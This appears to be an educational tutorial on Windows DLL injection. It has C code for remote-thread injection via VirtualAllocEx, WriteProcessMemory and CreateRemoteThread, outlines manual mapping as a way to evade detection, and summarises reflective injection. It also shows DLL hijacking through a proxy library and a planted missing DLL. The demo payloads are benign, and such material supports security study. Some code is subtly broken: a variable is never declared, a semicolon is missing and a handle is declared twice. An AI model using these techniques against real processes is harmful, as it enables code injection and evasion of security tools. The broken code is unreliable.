# DLL Injection

DLL injection is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process.

## LoadLibrary

The LoadLibrary API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current processâ€™s memory

```
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

Malicious : allocating memory within the target process for the DLL path and then initiating a remote thread that begins at LoadLibrary and directs towards the DLL path

```
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

## Manual Mapping

It avoids easy detection by not using the LoadLibrary function, whose usage is monitored by security and anti-cheat systems

1. Load the DLL as raw data into the injecting process.
2. Map the DLL sections into the targeted process.
3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.

## Reflective DLL Injection

Reflective DLL injection is a technique that utilizes reflective programming to load a library from memory into a host process.

https://github.com/stephenfewer/ReflectiveDLLInjection

1. Execution control is transferred to the library's ReflectiveLoader function, an exported function found in the library's export table. This can happen either via CreateRemoteThread() or a minimal bootstrap shellcode.
2. As the library's image currently resides in an arbitrary memory location, the ReflectiveLoader initially calculates its own image's current memory location to parse its own headers for later use.
3. The ReflectiveLoader then parses the host process's kernel32.dll export table to calculate the addresses of three functions needed by the loader, namely LoadLibraryA, GetProcAddress, and VirtualAlloc.
4. The ReflectiveLoader now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
5. The library's headers and sections are loaded into their new memory locations.
6. The ReflectiveLoader then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
7. The ReflectiveLoader then processes the newly loaded copy of its image's relocation table.
8. The ReflectiveLoader then calls its newly loaded image's entry point function, DllMain, with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.
9. Finally, the ReflectiveLoader returns execution to the initial bootstrap shellcode that called it, or if it were called via CreateRemoteThread, the thread would terminate."

## DLL Hijacking

DLL Hijacking is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

1. Press Windows key + R to open the Run dialog box.
2. Type in Regedit and press Enter. This will open the Registry Editor.
3. Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager.
4. In the right pane, look for the SafeDllSearchMode value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as SafeDllSearchMode.
5. Double-click SafeDllSearchMode. In the Value data field, enter 1 to enable and 0 to disable Safe DLL Search Mode.
6. Click OK, close the Registry Editor and Reboot the system for the changes to take effect.

With this mode enabled, applications search for necessary DLL files in the following sequence:

The directory from which the application is loaded.
The system directory.
The 16-bit system directory.
The Windows directory.
The current directory.
The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

The directory from which the application is loaded.
The current directory.
The system directory.
The 16-bit system directory.
The Windows directory
The directories that are listed in the PATH environment variable

DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:
- Process Explorer
- PE Explorer

Example of C code : main.exe

```
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```

Examining the program in Process Monitor (procmon), we can observe the process of loading the library.dll located in the same directory.

We can further filter for an Operation of Load Image to only get the libraries the app is loading :

### Proxying

We can utilize a method known as DLL Proxying to execute a Hijack. We will create a new library that will load the function Add from library.dll, tamper with it, and then return it to main.exe.

1. Create a new library: We will create a new library serving as the proxy for library.dll. This library will contain the necessary code to load the Add function from library.dll and perform the required tampering.
2. Load the Add function: Within the new library, we will load the Add function from the original library.dll. This will allow us to access the original function.
3. Tamper with the function: Once the Add function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add + 1 to the result.
4. Return the modified function: After completing the tampering process, we will return the modified Add function from the new library back to main.exe. This will ensure that when main.exe calls the Add function, it will execute the modified version with the intended changes.

```
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

### Invalid Libraries

Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in .dll and has a status of NAME NOT FOUND we can find such libraries in main.exe.

17:55:39,7848570	main.exe	37940	CreateFile	C:\Users\PandaSt0rm\Desktop\Hijack\x.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a

x.dll :

```
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

Either compile it or use the precompiled version provided. Rename hijack.dll to x.dll, and run main.exe.
